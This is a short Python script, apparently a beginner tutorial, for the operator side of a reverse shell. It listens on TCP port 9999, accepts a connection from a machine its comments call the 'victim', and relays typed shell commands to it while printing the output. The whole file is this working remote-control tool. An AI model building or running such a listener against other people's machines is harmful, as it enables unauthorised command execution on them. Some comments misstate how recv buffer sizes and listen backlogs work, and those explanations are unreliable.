import socket
import sys


#create a socket (connect to computers)
def create_socket():
	try:
		global host
		global port
		global s
		host=""
		port=9999
		s=socket.socket()
	except socket.error as msg:
		print("Socket Creation error :"+str(msg))


#Binding socket and listening for connection

def bind_socket():
	try:
		global host
		global port
		global s

		print("Binding the port :  "+str(port))

		s.bind((host,port)) #value inside it goes as tuple (host,port)
		#it is binding the host and port together

		s.listen(5)  #server should be continously listening to connections
		# 5 : it is the max limit it going to tolerate a bad connection
		#after limit it goes to exception


	except socket.error as msg:
		print("Socket Creation error :"+str(msg)+"\n"+"Retrying....")
		bind_socket()  #recursion ,this technique will try to bind the host and port together again.

#Establish connection with a client(socket  must be listening)

def socket_accept():
	conn,add=s.accept() #conn storing connection object
						#add storing a list of ip address and port

	print("Connection has been established !!"+"IP :",add[0],"PORT : ",add[1])
	#IP address and port of the client or victim
	send_commands(conn) #sending command to other machine
	conn.close()


def send_commands(conn):
	while True: #it will send infinite commands and not just one
		cmd=input() #command
		if cmd == 'quit': #for breaking the connectionjust type quit
			conn.close() #connection established is closed
			s.close() #socket is closed
			sys.exit() #open command prompt or terminal also close

		if len(str.encode(cmd))>0: #if some actual command is sent
			conn.send(str.encode(cmd)) #command is sent in encoded byte form
			client_response=str(conn.recv(1024),"utf-8") 
			#all information can't be sent in a whole ,so it is stored in chunks==1024bits
			#conn.recv recieves information from client
			#utf-8 it says information can be converted into string

			print(client_response,end="")

def main():
	create_socket()
	bind_socket()
	socket_accept()

main()



		

